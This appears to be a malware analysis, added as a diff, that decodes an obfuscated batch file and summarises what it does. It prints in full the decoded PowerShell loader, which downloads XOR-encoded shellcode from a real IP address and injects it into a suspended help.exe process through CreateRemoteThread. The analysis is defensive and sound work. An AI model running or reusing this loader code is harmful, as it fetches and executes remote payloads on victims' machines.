@@ -1,0 +1,113 @@
+================================================================================
+DECRYPTED VIEW OF: new.bat
+================================================================================
+The .bat file is not encrypted; it runs obfuscated PowerShell that decodes
+a hex-encoded script. Below is the equivalent logic in clear form.
+================================================================================
+
+--- STEP 1: Batch file (new.bat) ---
+
+@echo off
+
+REM Choose PowerShell path: 64-bit -> syswow64, 32-bit -> system32
+IF EXIST "%PROGRAMFILES(X86)%" (
+    set pspath="%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe"
+) ELSE (
+    set pspath="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe"
+)
+
+REM Run PowerShell minimized with the obfuscated command below
+start /MIN "" %pspath% -command "<OBFUSCATED_PAYLOAD>"
+
+--- STEP 2: Obfuscation layer ---
+
+The -command string:
+1. Sets a variable to a long HEX string (the real payload).
+2. Decodes that HEX string two characters at a time into ASCII.
+3. Runs the decoded string as PowerShell with Invoke-Command / ScriptBlock::Create.
+
+--- STEP 3: Decoded payload (what the HEX decodes to) ---
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION
+{
+    public IntPtr hP;
+    public IntPtr ht;
+    public uint dwProcessId;
+    public uint dwThreadId;
+}
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct STARTUPINFO
+{
+    public uint cb;
+    public string lpReserved;
+    public string lpDesktop;
+    public string lpTitle;
+    public uint dwX, dwY, dwXSize, dwYSize;
+    public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+    public uint wShowWindow;
+    public short cbReserved2;
+    public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+}
+public static class Kernel32
+{
+    [DllImport("kernel32.dll")]
+    public static extern bool CreateProcess(string a, string b, uint c, uint d, bool e, uint f, IntPtr g, string h, ref STARTUPINFO i, out PROCESS_INFORMATION j);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GlobalAlloc(uint a, uint b);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, IntPtr c, uint d, IntPtr e);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr WaitForSingleObject(IntPtr a, uint b);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, IntPtr g);
+}
+"@
+
+$webClient = New-Object System.Net.WebClient
+$url = "http://45.83.140.12/pot/jack/logo.bin"
+
+$shellbuf = $webClient.DownloadData($url)
+$shellsize = $shellbuf.Length
+for ($i = 1; $i -lt $shellsize; $i++) {
+    $shellbuf[$i] = $shellbuf[$i] -bxor $shellbuf[0]
+}
+
+$si = New-Object STARTUPINFO
+$pi = New-Object PROCESS_INFORMATION
+$addr = [Kernel32]::GlobalAlloc(0x40, $shellsize + 100)
+for ($i = 1; $i -lt $shellsize; $i++) {
+    [System.Runtime.InteropServices.Marshal]::WriteByte($addr, $i - 1, $shellbuf[$i])
+}
+[Kernel32]::CreateProcess("c:\windows\SysWOW64\help.exe", 0, 0, 0, 0, 0x04, 0, "c:", [ref] $si, [ref] $pi)
+$kZZZZ = $pi.hP
+$mZZZZ = [Kernel32]::VirtualAllocEx($kZZZZ, 0, $shellsize + 100, 0x1000, 0x40)
+[Kernel32]::WriteProcessMemory($kZZZZ, $mZZZZ, $addr, $shellsize, 0)
+$lZZZZ = [Kernel32]::CreateRemoteThread($kZZZZ, 0, 0, $mZZZZ, 0, 0, 0)
+[Kernel32]::WaitForSingleObject($lZZZZ, 500*1000)
+
+================================================================================
+SUMMARY (what this file actually does)
+================================================================================
+
+1. Runs PowerShell minimized (so the window is hidden).
+2. Decodes a hex-encoded PowerShell script and executes it.
+3. That script:
+   - Compiles inline C# that P/Invokes kernel32: CreateProcess, GlobalAlloc,
+     VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, WaitForSingleObject.
+   - Downloads binary data from: http://45.83.140.12/pot/jack/logo.bin
+   - XOR-decrypts the download using the first byte as the key.
+   - Starts a suspended process: c:\windows\SysWOW64\help.exe (CREATE_SUSPENDED).
+   - Injects the decrypted shellcode into that process and runs it via
+     CreateRemoteThread, then waits up to 500 seconds.
+
+This is process hollowing / shellcode injection behavior commonly associated
+with malware (e.g. loaders, coin miners, RATs). Do not run this file on a
+system you care about; treat it as hostile.
+================================================================================
